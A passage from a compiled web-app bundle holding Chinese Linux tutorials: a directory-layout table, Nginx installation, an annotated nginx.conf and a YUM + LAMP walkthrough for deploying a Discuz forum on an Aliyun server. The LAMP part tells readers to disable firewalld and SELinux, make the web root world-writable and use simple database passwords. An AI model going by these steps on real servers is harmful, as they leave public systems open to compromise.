,存放系统命令，普通用户和 root 都可以执行。放在 /bin 下的命令在单用户模式下也可以执行 |\r\n| boot       | boot loader files    | 系统启动时需要读取的目录 ,系统启动目录，保存与系统启动相关的文件，如内核文件和启动引导程序（GRUB或LILO）文件等 |\r\n| dev        | device files         | 存放设备文件的目录（device） Linux中，设备分为两种：块设备（block）、字符设备（character）。 硬盘、软驱、光驱都属于“块设备”， 鼠标、键盘都属于“字符设备”。 |\r\n| etc        | configuration  files | 系统的配置文件（系统的信息存放在这里，比如我们的帐号以及密码）,系统内所有采用默认安装方式（rpm 安装）的服务配置文件全部保存在此目录中，如用户信息、服务的启动脚本、常用服务的配置文件等 |\r\n| home       | home                 | 普通用户的主目录，（也称为家目录）。类似于Windows的C:\\Documents and Settings下的目录. 每个用户要有一个默认登录和保存自己数据的位置，就是用户的主目录，所有普通用户的主目录是在 /home/ 下建立一个和用户名相同的目录。如用户 liming 的主目录就是 /home/liming |\r\n| initrd     |                      | 初始化的目录，比如我们希望系统开机的时候配置一下IP           |\r\n| lib        | system libraies      | 库函数的目录（Library），类似“外挂”目录 ,系统调用的函数库保存位置 |\r\n| lib64      |                      | 作用同 lib 目录                                              |\r\n| lost+found |                      | 系统出错时，会存放一些丢失的文件在这个目录里 ，当系统意外崩溃或意外关机时，产生的一些文件碎片会存放在这里。在系统启动的过程中，fsck 工具会检查这里，并修复已经损坏的文件系统。 这个目录只在每个分区中出现，例如，/lost+found 就是根分区的备份恢复目录，/boot/lost+found 就是 /boot 分区的备份恢复目录 |\r\n| media      | removable devices    | 挂载目录。系统建议用来挂载媒体设备，如软盘和光盘 ，存放一些可删除的设备文件 ，光盘，软驱 |\r\n| misc       |                      | 挂载目录。系统建议用来挂载 NFS 服务的共享目录。虽然系统准备了三个默认挂载目录 /media/、/mnt/、/misc/，但是到底在哪个目录中挂载什么设备可以由管理员自己决定。 例如，笔者在接触 Linux 的时候，默认挂载目录只有 /mnt/，所以养成了在 /mnt/ 下建立不同目录挂载不同设备的习惯，如 /mnt/cdrom/ 挂载光盘、/mnt/usb/ 挂载 U 盘，都是可以的 |\r\n| mnt        | mount directory      | 存放一些临时需要挂载（mount）的设备 ,移动硬盘，U盘 ，挂载目录。早期 Linux 中只有这一个挂载目录，并没有细分。系统建议这个目录用来挂载额外的设备，如 U 盘、移动硬盘和其他操作系统的分区。可以参看/etc/fstab的定义。有时我们可以把让系统开机自动挂载文件系统，把挂载点放在这里也是可以的。主要看/etc/fstab中怎 么定义了；比如光驱可以挂载到/mnt/cdrom |\r\n| opt        | optional add-on Apps | 类似于windows的Programfiles目录，一般是用来安装程序的。optional（可选） 第三方安装的软件保存位置。这个目录是放置和安装其他软件的位置，手工安装的源码包软件都可以安装到这个目录中。不过笔者还是习惯把软件放到 /usr/local/ 目录中，也就是说，/usr/local/ 目录也可以用来安装软件。这里主要存放那些可选的程序。你想尝试最新的firefox测试版吗?那就装到/opt目录下吧，这样，当你尝试完，想删掉firefox的时候，你就可 以直接删除它，而不影响系统其他任何设置。安装到/opt目录下的程序，它所有的数据、库文件等等都是放在同个目录下面。举个例子：刚才装的测试版firefox，就可以装到/opt/firefox_beta目录下，/opt/firefox_beta目录下面就包含了运 行firefox所需要的所有文件、库、数据等等。要删除firefox的时候，你只需删除/opt/firefox_beta目录即可，非常简单。 |\r\n| proc       | process  information | 虚拟文件系统。特殊目录。这里的所有文件都不是在硬盘里的，而是在内存里的。也就是这个目录的文件都是内存的真实映射。 该目录中的数据并不保存在硬盘上，而是保存到内存中。主要保存系统的内核、进程、外部设备状态和网络状态等。操作系统运行时，进程信息及内核信息（比如cpu、硬盘分区、内存信息等）存放在这里。/proc目录伪装的文件系统proc的挂载目录，proc并不是真正的文件系统，它的定义可以参见 /etc/fstab 。 如 /proc/cpuinfo 是保存 CPU 信息的，/proc/devices 是保存设备驱动的列表的，/proc/filesystems 是保存文件系统列表的，/proc/net 是保存网络协议信息的… |\r\n| root       |                      | 超级用户的主目录，也就是root的主目录，类似于C:\\Documents and Settings\\Administrator ,root 的主目录。普通用户主目录在 /home/ 下，root 主目录直接在“/”下 |\r\n| sbin       | system binaries      | 类似于bin目录。区别在于sbin目录的东西都是给superuser的，即superuser’sbin ,保存与系统环境设置相关的命令，只有 root 可以使用这些命令进行系统环境设置，但也有些命令可以允许普通用户查看。大多是涉及系统管理的命令的存放，是超级权限用户root的可执行命令存放地，普通用户无权限执行这个目录下的命令，这个目录和/usr/sbin; /usr/X11R6/sbin或/usr/local/sbin目录是相似的；我们记住就行了，凡是目录sbin中包含的都是root权限才能执行的。 |\r\n| selinux    |                      | SecureLinux关于安全策略的配置                                |\r\n| srv        | service data         | 服务需要取的数据目录 ,服务数据目录。一些系统服务启动之后，可以在这个目录中保存所需要的数据 |\r\n| sys        |                      | 虚拟文件系统。和 proc 目录相似，该目录中的数据都保存在内存中，主要保存与内核相关的信息.同样不占硬盘空间 |\r\n| tmp        |                      | 临时目录temporary 。系统存放临时文件的目录，在该目录下，所有用户都可以访问和写入。建议此目录中不能保存重要数据，最好每次开机都把该目录清理 |\r\n| usr        | user programs        | 类似于前面的opt目录，但是存放在这个地方的软件都是很重要的。相当于windows里C:\\WINDOWS和C:\\Program Files的综合体。Usr=Unix Software Resource. 在这个目录下，你可以找到那些不适合放在/bin或/etc目录下的额外的工具。比如像游戏阿，一些打印工具拉等等。/usr目录包含了许多子目录： /usr/bin目录用于存放程序;/usr/share用于存放一些共享的数据，比如音乐文件或者图标等等;/usr/lib目录用于存放那些不能直接 运行的，但却是许多程序运行所必需的一些函数库文件。你的软件包管理器(应该是“yum”吧)会自动帮你管理好/usr目录的。 |\r\n| usr/local  |                      | 这里主要存放那些手动安装的软件，即不是通过“yum”或apt-get安装的软件。它和/usr目录具有相类似的目录结构。让软件包管理器来管理/usr目录，而把自定义的脚本(scripts)放到/usr/local目录下面。一般是通过源码包安装的软件，如果没有特别指定安装目录的话，一般是安装在这个目录中。 |\r\n| usr/share  |                      | 系统共用的东西存放地，比如 /usr/share/fonts 是字体目录，/usr/share/doc和/usr/share/man帮助文件。 |\r\n| var        | variable files       | 常态性变动的文件，比如缓存、mysql文件、mail的数据 ，系统日志等 |\r\n| var/log    |                      | 系统日志存放，分析日志要看这个目录的东西                     |\r\n| var/spool  |                      | 打印机、邮件、代理服务器等假脱机目录；                       |\r\n\r\n",xn={data:function(){return{MainComponent:_n}}},wn=xn,En=Object(c["a"])(wn,yn,fn,!1,null,"60e64c33",null),Tn=En.exports,kn=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},Cn=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"text-h3"},[n._v("Linux Web运维（Nginx）")]),t("pre",[n._v("    1、添加源\n\n默认情况Centos7中无Nginx的源，最近发现Nginx官网提供了Centos的源地址。因此可以如下执行命令添加源：\n\nsudo rpm -Uvh http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm\n\n2、安装Nginx\n\n通过yum search nginx看看是否已经添加源成功。如果成功则执行下列命令安装Nginx。\n\nsudo yum install -y nginx\n\n3、启动Nginx并设置开机自动运行\n\nsudo systemctl start nginx.service\nsudo systemctl enable nginx.service\n \n\n4.建立软连接 快捷启动方式  根据实际的路径 建立\n ln -s /usr/local/nginx/sbin/nginx   /usr/local/sbin/\n \nnginx 配置文件 健康检查  语法检查\nnginx -t\n\n重启服务 \nservice nginx restart\n\n")])])}],jn={},Mn=jn,Rn=Object(c["a"])(Mn,kn,Cn,!1,null,"199827d2",null),Ln=Rn.exports,On=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},An=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"text-h3"},[n._v("Nginx配置文件详解")]),t("pre",[n._v('  \n—————————————————————————————\n1\n\nNginx 配置文件详解\nuser www www;\n#程序运行用户和组\nworker_processes auto;\n#启动进程，指定 nginx 启动的工作进程数量，建议按照 cpu 数目来指定，一般等于 cpu 核心数目\nerror_log /home/wwwlogs/nginx_error.log crit;\n#全局错误日志\npid /usr/local/nginx/logs/nginx.pid;\n#主进程 PID 保存文件\nworker_rlimit_nofile 51200;\n#文件描述符数量\nevents \n    {\n    use epoll; \n    #使用 epoll 模型，对于 2.6 以上的内核，建议使用 epoll 模型以提高性能\n    worker_connections 51200;\n    #工作进程的最大连接数量，根据硬件调整，和前面工作进程配合起来用，尽量大，但是别把 cpu\n    跑到 100%就行每个进程允许的最多连接数， 理论上每台 nginx 服务器的最大连接数为\n    worker_processes*worker_connections，具体还要看服务器的硬件、带宽等。\n    }\nhttp \n    #整体环境配置--网站配置\n    {\n    include mime.types;\n    default_type application/octet-stream;\n    #设定 mime 类型,文件传送类型由 mime.type 文件定义\n    server_names_hash_bucket_size 128;\n    #保存服务器名字的 hash 表大小\n    client_header_buffer_size 32k;\n    #客户端请求头部缓冲区大小\n    large_client_header_buffers 4 32k;\n    #最大客户端头缓冲大小\n    \n    \n    client_max_body_size 50m;\n    #客户端最大上传文件大小（M）\n    sendfile on;\n    #sendfile 指令指定 nginx 是否调用 sendfile 函数来输出文件，对于普通应用，必须设\n    为 on。如果用来进行下载等应用磁盘 IO 重负载应用，可设置为 off，以平衡磁盘与网络 I/O 处理速度，\n    降低系统的 uptime.\n    tcp_nopush on;\n    #这个是默认的，结果就是数据包不会马上传送出去，等到数据包最大时，一次性的传\n    输出去，这样有助于解决网络堵塞。（只在 sendfile on 时有效）\n    keepalive_timeout 60;\n    #连接超时时间\n    tcp_nodelay on;\n    #禁用 nagle 算法，也即不缓存数据。有效解决网络阻塞\n    fastcgi_connect_timeout 300;\n    fastcgi_send_timeout 300;\n    fastcgi_read_timeout 300;\n    fastcgi_buffer_size 64k;\n    fastcgi_buffers 4 64k;\n    fastcgi_busy_buffers_size 128k;\n    fastcgi_temp_file_write_size 256k;\n    #fastcgi 设置\n    gzip on;\n    gzip_min_length 1k;\n    gzip_buffers 4 16k;\n    gzip_http_version 1.1;\n    gzip_comp_level 2;\n    gzip_types text/plain application/javascript application/x-javascript text/javascript \n    text/css application/xml application xml+rss;\n    gzip_vary on;\n    gzip_proxied expired no-cache no-store private auth;\n    gzip_disable "MSIE [1-6]\\.";\n    #limit_conn_zone $binary_remote_addr zone=perip:10m;\n    ##If enable limit_conn_zone,add "limit_conn perip 10;" to server section.\n    server_tokens off;\n    #隐藏 nginx 版本号（curl -I 192.168.4.154 可以查看，更加安全）\n    #log format\n    \n    \n\n    log_format access \'$remote_addr - $remote_user [$time_local] "$request"\'\n    \'$status $body_bytes_sent "$http_referer" \'\n    \'"$http_user_agent" $http_x_forwarded_for\';\n    #定义日志格式\n    server\n        {\n        listen 80 default_server;\n        #listen [::]:80 default_server ipv6only=on;\n        #监听 80 端口，WEB 服务的监听设置，可以采用"IP 地址:端口"形式\n        server_name www.lnmp.org lnmp.org;\n        #服务器名，可以写多个域名，用空格分隔\n        index index.html index.htm index.php;\n        #默认网页文件\n        root /home/wwwroot/default;\n        #网页主目录\n        #error_page 404 /404.html;\n        include enable-php.conf;\n        \n        location /nginx_status\n        {\n        stub_status on;\n        access_log off;\n        } #开启 status 状态监测\n        location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$\n        {\n        expires 30d;\n        } #静态文件处理，保存期 30 天\n        location ~ .*\\.(js|css)?$\n        {\n        expires 12h;\n        }\n        #js 和 css 文件处理，保存期 12 小时\n        location ~ /\\.\n        {\n        deny all;\n        }\n        access_log /home/wwwlogs/access.log access;\n        \n \n\n        #正确访问日志\n    }\n    include vhost/*.conf;\n    #vhost/下子配置文件生效\n}\n\n')])])}],In={},Dn=In,Pn=Object(c["a"])(Dn,On,An,!1,null,"aa01b01e",null),Nn=Pn.exports,qn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{extend:n.extendMarkdown,src:n.MainComponent}})],1)},Hn=[],Bn="\x3c!--\r\n * @Date           : 2021-07-15 00:12:03\r\n * @FilePath       : /jinnian-space/src/pages/linux/md/linux-yum+LAMP开源部署.md\r\n * @Description    : \r\n--\x3e\r\n\r\n# YUM+LAMP开源部署 Discuz 论坛\r\n\r\n# YUM\r\n\r\n## 1、什么是YUM\r\n\r\n在CentOS系统中，软件管理方式通常有三种方式：`rpm安装`、`yum安装`以及`编译安装`。\r\n\r\n```powershell\r\n编译安装，从过程上来讲比较麻烦，包需要用户自行下载，下载的是源码包，需要进行编译操作，编译好了才能进行安装，这个过程对于刚接触Linux的人来说比较麻烦，而且还容易出错。好处在于是源码包，对于有需要自定义模块的用户来说非常方便。(就业班会着重讲解)\r\n```\r\n\r\n难度：编译安装 > rpm安装 > yum安装（有网络 + yum源支持）\r\n\r\nYum（全称为 `Yellow dog Updater, Modified`）是一个在Fedora和RedHat以及CentOS中的Shell前端软件包管理器。\r\n\r\n基于rpm包管理，能够从**指定的服务器**(yum源）自动下载RPM包并且安装，可以==自动处理依赖性关系==，并且==一次安装所有依赖的软件包==，无须繁琐地一次次下载、安装。\r\n\r\n> rpm和yum区别？答：① yum底层也是基于rpm进行安装的（yum安装的软件，可以通过rpm -qa进行查询） ② yum相对于rpm最大的优势，可以解决依赖关系。\r\n>\r\n> A => B => C\r\n\r\n## 2、YUM源配置\r\n\r\n![image-20200326115612781](media/image-20200326115612781.png)\r\n\r\nYUM源配置文件所在路径 => /etc/yum.repos.d文件夹\r\n\r\n-rw-r--r--. 1 root root 1991 Mar 28  2017 CentOS-Base.repo            网络yum源配置文件\r\n-rw-r--r--. 1 root root  647 Mar 28  2017 CentOS-Debuginfo.repo    内核相关的更新包\r\n-rw-r--r--. 1 root root  289 Mar 28  2017 CentOS-fasttrack.repo       快速通道\r\n-rw-r--r--. 1 root root  630 Mar 28  2017 CentOS-Media.repo           本地yum源配置文件\r\n-rw-r--r--. 1 root root 7989 Mar 28  2017 CentOS-Vault.repo          最近版本加入老本的YUM配置   \r\n\r\n扩展：在YUM镜像源中添加阿里云镜像源\r\n\r\n```powershell\r\n第一步：备份CentOS-Base.repo这个源（更改后缀名.repo => .repo.bak）\r\n# mv CentOS-Base.repo CentOS-Base.repo.bak\r\n\r\n第二步：使用wget命令下载阿里云的镜像文件\r\n# wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo\r\n\r\n选项说明：\r\n-O ：指定文件下载的位置以及名称\r\n第三步：清理YUM缓存\r\n# yum clean all\r\n\r\n第四步：重新建立缓存（让新YUM源生效）\r\n# yum makecache\r\n```\r\n\r\n## 3、yum命令详解\r\n\r\n### ☆ 搜索要安装的软件\r\n\r\n```powershell\r\n# yum search 软件名称的关键词\r\n```\r\n\r\n案例：搜索阿里云仓库中的vim软件\r\n\r\n```powershell\r\n# yum search vim\r\n```\r\n\r\n案例：搜索firefox火狐浏览器\r\n\r\n```powershell\r\n# yum search firefox\r\n```\r\n\r\n### ☆ 使用yum安装软件\r\n\r\n基本语法：\r\n\r\n```powershell\r\n# yum install 软件名称关键词 [选项]\r\n选项：\r\n-y ：yes缩写，确认安装，不提示。\r\n```\r\n\r\n案例：使用yum命令安装vim编辑器\r\n\r\n```powershell\r\n# yum install vim -y\r\n```\r\n\r\n案例：使用yum命令安装firefox浏览器\r\n\r\n```powershell\r\n# yum install firefox -y\r\n```\r\n\r\n### ☆ 使用yum卸载软件\r\n\r\n```powershell\r\n# yum remove 软件名称关键词 [选项]\r\n选项：\r\n-y ：yes缩写，确认卸载，不提示。\r\n```\r\n\r\n案例：把firefox火狐浏览器进行卸载操作\r\n\r\n```powershell\r\n# yum remove firefox -y\r\n```\r\n\r\n案例：把httpd软件进行强制卸载\r\n\r\n```powershell\r\n# yum remove httpd -y\r\n```\r\n\r\n### ☆ 使用yum更新软件\r\n\r\n基本语法：\r\n\r\n```powershell\r\n# yum update 软件名称关键词 [选项]\r\n选项：\r\n-y ：yes缩写，确认更新，不提示\r\n```\r\n\r\n案例：把vim编辑器进行更新操作\r\n\r\n```powershell\r\n# yum update vim -y\r\n```\r\n\r\n案例：把firefox火狐浏览器进行更新操作\r\n\r\n```powershell\r\n# yum update firefox -y\r\n```\r\n\r\n# 三、LAMP概述\r\n\r\n## 1、什么是LAMP\r\n\r\nLAMP：==L==inux + ==A==pache + ==M==ySQL + ==P==HP                        LAMP 架构（组合）\r\n\r\nLNMP：Linux + Nginx + MySQL + php-fpm                             LNMP 架构（组合）\r\n\r\nLNMPA：Linux + Nginx(80) + MySQL + PHP + Apache           Nginx 代理方式\r\n\r\n![image-20200326152052773](media/image-20200326152052773.png)\r\n\r\nApache：Apache是世界使用排名第一的Web服务器软件。\r\n\r\nPHP：一种专门用于Web开发的编程语言。\r\n\r\nMySQL：MySQL是一个关系型数据库管理系统，主要用于永久存储项目数据。\r\n\r\n## 2、AMP三者之间的关系\r\n\r\n![image-20200326152231295](media/image-20200326152231295.png)\r\n\r\nApache：用于接收用户的请求（输入网址，返回网页=>结果）\r\n\r\nPHP：注册、登录、加入购物车、下单、支付等动态功能（有编程语言的支持）\r\n\r\nMySQL：永久保存数据，比如你在网站上注册的用户和密码、你加入购物车的产品、你的产品订单\r\n\r\nLAMP = Linux + APache + PHP + MySQL\r\n\r\n# 四、阿里云详解\r\n\r\n要想部署一个互联网上可以访问到的环境，必须先具备以下内容 ：\r\n\r\n服务器（IP、帐号密码、终端）、相应的软件、域名（备案、解析）、代码等。\r\n\r\n![image-20200326154214921](media/image-20200326154214921.png)\r\n\r\n代码：前端工程师 + 后端工程师进行开发提供的！\r\n\r\n## 1、注册阿里云账号\r\n\r\n阿里云官网：https://www.aliyun.com/\r\n\r\n![image-20200326154527903](media/image-20200326154527903.png)\r\n\r\n> 特别说明：云服务器的厂商特别多，你可以进行任意选择 => 阿里云、百度云、腾讯云、华为云...\r\n\r\n注册时建议使用支付宝，方便快捷。最重要：付款方便\r\n\r\n## 2、实名认证（上传身份证照片）\r\n\r\n第一步：单击账号下方的实名认证（选择个人认证）\r\n\r\n![image-20200326155133047](media/image-20200326155133047.png)\r\n\r\n![image-20200326155146301](media/image-20200326155146301.png)\r\n\r\n第二步：选择支付宝授权认证（及时开通，无需等待）\r\n\r\n![image-20200326155223066](media/image-20200326155223066.png)\r\n\r\n第三步：勾选同意，点击提交\r\n\r\n![image-20200326155308208](media/image-20200326155308208.png)\r\n\r\n第四步：使用手机支付宝扫描二维码，进行授权\r\n\r\n![image-20200326155339781](media/image-20200326155339781.png)\r\n\r\n第五步：填写相关信息（住址）\r\n\r\n![image-20200326155358292](media/image-20200326155358292.png)\r\n\r\n填写完毕，即可完成认证。\r\n\r\n![image-20200326155428202](media/image-20200326155428202.png)\r\n\r\n## 3、购买阿里云的ECS云服务器\r\n\r\n第一步：回到阿里云首页，找到弹性计算 => ECS云服务器\r\n\r\n![image-20200326161759062](media/image-20200326161759062.png)\r\n\r\n第二步：单击立即购买，购买ECS服务器（选区域、选配置）\r\n\r\n![image-20200326161916781](media/image-20200326161916781.png)\r\n\r\n第三步：选择付费模式、选择CPU与内存的配置\r\n\r\n![image-20200326162659403](media/image-20200326162659403.png)\r\n\r\n第四步：选择镜像（CentOS7.6）与云盘（硬盘）\r\n\r\n![image-20200326162845467](media/image-20200326162845467.png)\r\n\r\n第四步：设置网络、公网IP以及安全组（重要）\r\n\r\n![image-20200326163143681](media/image-20200326163143681.png)\r\n\r\n> 用户 =>  阿里云安全组  =>  firewalld防火墙  => Linux服务器\r\n\r\n第五步：设置root账号密码（一定要选择自定义密码）\r\n\r\n![image-20200326163533492](media/image-20200326163533492.png)\r\n\r\n> 8 - 30 个字符，必须同时包含三项（大写字母、小写字母、数字、 ()`~!@#$%^&*_-+=|{}[]:;'<>,.?/ 中的特殊符号），其中 Windows 实例不能以斜线号（/）为首字符\r\n\r\n第六步：设置释放时间 => 什么时候删除这台服务器（不收钱）\r\n\r\n![image-20200326163830484](media/image-20200326163830484.png)\r\n\r\n> 特别说明：只有个人购买的ECS服务器可以设置释放时间，生产环境一定不要设置释放时间，否则后果自负！！！\r\n\r\n第七步：进入管理控制台，找到我们刚才购买的ECS服务器，如下图所示：\r\n\r\n![image-20200326164148544](media/image-20200326164148544.png)\r\n\r\n> 使用MX软件，直接连接公网IP + root账号 + 自定义的密码即可连接\r\n\r\n## 4、使用MX连接ECS服务器\r\n\r\n![image-20200326164519379](media/image-20200326164519379.png)\r\n\r\n## 5、使用yum安装sl小工具\r\n\r\n安装过程：\r\n\r\n```powershell\r\n# yum install sl -y\r\n```\r\n\r\n使用sl命令：\r\n\r\n```powershell\r\n# sl\r\n```\r\n\r\n# LAMP项目部署实战\r\n\r\n# 一、LAMP环境部署\r\n\r\n## 1、回顾LAMP\r\n\r\nLAMP = Linux + Apache + MySQL + PHP\r\n\r\n![image-20200327093726255](media/image-20200327093726255.png)\r\n\r\nApache：主要用于接收用户的请求，处理业务逻辑，返回结果给客户端（浏览器）\r\n\r\nPHP：编程语言的一种，主要应用于Web开发。主要实现注册、登录、加入购物车、下单、支付等功能\r\n\r\nMySQL：数据库，删库到跑路，这里的\"库\"就是指数据库。永久保存数据\r\n\r\n## 2、LAMP部署前期准备\r\n\r\n### ☆ 关闭防火墙\r\n\r\n```powershell\r\n# systemctl stop firewalld\r\n# systemctl disable firewalld\r\n```\r\n\r\n### ☆ 关闭SELinux\r\n\r\n*SELinux*(Security-Enhanced Linux) 是美国国家安全局（NSA）对于强制访问控制的实现，是 Linux历史上最杰出的新安全子系统。\r\n\r\n获取SELinux的状态：\r\n\r\n```powershell\r\n# getenforce\r\n```\r\n\r\n临时关闭SElinux：重启后SELinux还会自动启动\r\n\r\n```powershell\r\n# setenforce 0\r\n```\r\n\r\n永久关闭SELinux：编辑SELinux的配置文件\r\n\r\n```powershell\r\n# vim /etc/selinux/config\r\nSELINUX=disabled\r\n```\r\n\r\n### ☆ 检查系统中是否已安装Apache\r\n\r\n```powershell\r\n# rpm -qa |grep httpd\r\n\r\n# rpm -e httpd-2.4.6-90.el7.centos.x86_64\r\n# rpm -e httpd-tools-2.4.6-90.el7.centos.x86_64\r\n```\r\n\r\n### ☆ 检查系统中是否已安装MySQL\r\n\r\n```powershell\r\n# rpm -qa |grep mysql\r\n```\r\n\r\n### ☆ 检查系统中是否已安装PHP\r\n\r\n```powershell\r\n# rpm -qa |grep php\r\n```\r\n\r\n> AMP安装指南：在Linux中安装AMP必须先安装Apache，在安装MySQL，最后安装PHP\r\n\r\n## 3、LAMP环境之Apache安装\r\n\r\nApache：阿帕奇，Apache基金会\r\n\r\nhttpd软件 => 前身apache，随着时间的推移以及互联网行业的发展，越来越多的软件加入到了Apache的基金会。\r\n\r\n第一步：安装httpd软件\r\n\r\n```powershell\r\n# yum install httpd -y\r\n```\r\n\r\n第二步：配置/etc/httpd/conf/httpd.conf文件\r\n\r\n```powershell\r\n# vim /etc/httpd/conf/httpd.conf\r\n/ServerName => 搜索\r\n96 ServerName localhost:80\r\n```\r\n\r\n> localhost ： 代表本机，对应的IP地址可以使127.0.0.1或本机的公网IP\r\n\r\n第三步：启动httpd服务\r\n\r\n```powershell\r\n# systemctl start httpd\r\n```\r\n\r\n第四步：把httpd服务添加到开机启动项中\r\n\r\n```powershell\r\n# systemctl enable httpd\r\n```\r\n\r\n第五步：使用ss或netstat命令查询httpd占用的端口\r\n\r\n```powershell\r\n# netstat -tnlp |grep httpd\r\n或\r\n# ss -naltp |grep httpd\r\n```\r\n\r\n第六步：在浏览器中，使用公网IP访问阿里云服务器\r\n\r\n![image-20200327104156113](media/image-20200327104156113.png)\r\n\r\n## 4、LAMP环境之MySQL安装\r\n\r\n### ☆ 下载MySQL的官网yum源\r\n\r\n由于yum源上默认没有mysql-server。所以必须去官网下载后在安装\r\n\r\n```powershell\r\n# wget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm\r\n```\r\n\r\n### ☆ 安装MySQL的官网镜像源\r\n\r\n```powershell\r\n# rpm -ivh mysql-community-release-el7-5.noarch.rpm\r\n```\r\n\r\n### ☆ 使用yum安装mysql最新版软件\r\n\r\n```powershell\r\n# yum install mysql-community-server -y\r\n```\r\n\r\n> MySQL软件是一个C/S架构的软件，拥有客户端与服务器端。mysql-server服务器端（内部也包含了客户端），community代表社区版（免费开源）\r\n\r\n### ☆ 启动mysql，查看端口占用情况\r\n\r\n```powershell\r\n# systemctl start mysqld\r\n# netstat -tnlp |grep mysqld\r\n```\r\n\r\n### ☆ MySQL数据库初始化（重要）\r\n\r\n默认情况下，数据库没有密码，也没有任何数据，必须要初始化\r\n\r\n#### ① 初始化数据，设置root密码（MySQL管理员）\r\n\r\n```powershell\r\n# mysql_secure_installation\r\n```\r\n\r\n![image-20200327114309107](media/image-20200327114309107.png)\r\n\r\n> 扩展：以上说的root和Linux中的root不是同一个用户，这个root代表MySQL数据库的管理员，只不过这个管理员也叫root。\r\n\r\n![image-20200327114444955](media/image-20200327114444955.png)\r\n\r\n![image-20200327114530976](media/image-20200327114530976.png)\r\n\r\n> 学习环境下，密码越简单越好。生产环境下越复杂越好。\r\n\r\n![image-20200327114717525](media/image-20200327114717525.png)\r\n\r\n![image-20200327114820459](media/image-20200327114820459.png)\r\n\r\n![image-20200327114907975](media/image-20200327114907975.png)\r\n\r\n![image-20200327114951007](media/image-20200327114951007.png)\r\n\r\n#### ② 把mysqld服务添加到开机启动项\r\n\r\n```powershell\r\n# systemctl enable mysqld\r\n```\r\n\r\n默认已经开机启动，这里可以跳过\r\n\r\n#### ③ 连接MySQL数据库，测试\r\n\r\n```powershell\r\n# mysql -u root -p 回车\r\nEnter password:输入刚才设置的密码，如123，回车\r\nmysql> show databases;    =>   代表显示所有数据库\r\nmysql> exit\r\n```\r\n\r\n## 5、LAMP环境之PHP安装\r\n\r\n### ☆ 使用yum命令安装php软件\r\n\r\n```powershell\r\n# yum install php -y\r\n```\r\n\r\n### ☆ 使用systemctl启动php软件（重启Apache）\r\n\r\n```powershell\r\n# systemctl restart httpd\r\n```\r\n\r\n> 为什么启动php就是重启Apache呢？答：因为LAMP架构中，PHP是以模块的形式追加到Apache的内核中，所以启动php就相当于重置Apache软件\r\n\r\n![image-20200327142246747](media/image-20200327142246747.png)\r\n\r\n### ☆ 测试LAMP环境是否可以使用\r\n\r\n第一步：使用cd命令进入/var/www/html目录\r\n\r\n```powershell\r\n# cd /var/www/html\r\nApache的项目目录 => /var/www/html，以后程序员开发的代码都是放置于此目录\r\n```\r\n\r\n第二步：使用vim命令创建demo.php文件\r\n\r\n```powershell\r\n# vim demo.php\r\n```\r\n\r\n第三步：编写php代码\r\n\r\n```php\r\n<?php\r\n\techo 'hello world';\r\n?>\r\n```\r\n\r\n编写完成后，保存退出，然后在浏览器中使用http://公网IP/demo.php\r\n\r\n![image-20200327142839268](media/image-20200327142839268.png)\r\n\r\n# 二、部署Discuz!论坛\r\n\r\n## 1、Discuz!论坛概述\r\n\r\nDiscuz！论坛是基于PHP + MySQL进行开发的一套开源的论坛系统。\r\n\r\n![image-20200327151556113](media/image-20200327151556113.png)\r\n\r\n## 2、下载源代码\r\n\r\n下载地址：https://gitee.com/ComsenzDiscuz/DiscuzX  （码云）\r\n\r\n![image-20200327151754516](media/image-20200327151754516.png)\r\n\r\n## 3、使用MX软件把Discuz源代码上传\r\n\r\n阿里云：\r\n\r\n![image-20200327152029513](media/image-20200327152029513.png)\r\n\r\n本地Linux类似\r\n\r\n## 4、安装unzip解压缩软件\r\n\r\n```powershell\r\n# yum install unzip -y\r\n```\r\n\r\n## 5、使用unzip对discuz.zip压缩包进行解压\r\n\r\n```powershell\r\n# unzip discuz.zip\r\n```\r\n\r\n## 6、复制discuz中的文件到/var/www/html目录\r\n\r\n```powershell\r\n# mv discuz/* /var/www/html/\r\n或\r\n# cp -vRp disczu/* /var/www/html/\r\n```\r\n\r\n## 7、打开浏览器，输入公网IP地址\r\n\r\n![image-20200327153135696](media/image-20200327153135696.png)\r\n\r\n## 8、单击同意许可，继续安装\r\n\r\n![image-20200327154443886](media/image-20200327154443886.png)\r\n\r\n## 9、给/var/www/html目录设置可写权限\r\n\r\n```powershell\r\n# chmod -R a+w /var/www/html\r\n```\r\n\r\n> 注意：以上操作是给所有文件添加一个w权限，但是生产环境尽量针对指定文件添加权限。\r\n\r\n## 10、解决PHP扩展问题\r\n\r\n![image-20200327154906078](media/image-20200327154906078.png)\r\n\r\n以上提示代表，安装PHP时没有安装php-mysqli扩展，所以会出现以上问题。\r\n\r\n```powershell\r\n# yum install php-mysqli -y\r\n# systemctl restart httpd\r\n```\r\n\r\n## 11、设置运行环境\r\n\r\n![image-20200327155142197](media/image-20200327155142197.png)\r\n\r\n## 12、设置MySQL数据库的相关信息\r\n\r\n![image-20200327155441330](media/image-20200327155441330.png)\r\n\r\n## 13、设置管理员账号和密码\r\n\r\n![image-20200327155536618](media/image-20200327155536618.png)\r\n\r\n## 14、安装完成后，访问论坛首页\r\n\r\n![image-20200327155648008](media/image-20200327155648008.png)\r\n\r\n部署后，访问论坛首页，如下图所示：\r\n\r\n![image-20200327155712092](media/image-20200327155712092.png)\r\n\r\n# 三、域名与解析\r\n\r\n## 1、为什么需要域名\r\n\r\n我们现在访问论坛是通过IP地址实现的，但是IP地址比较复杂，更重要的是不方便用户记忆。\r\n\r\n域名 => 代替公网IP地址\r\n\r\n## 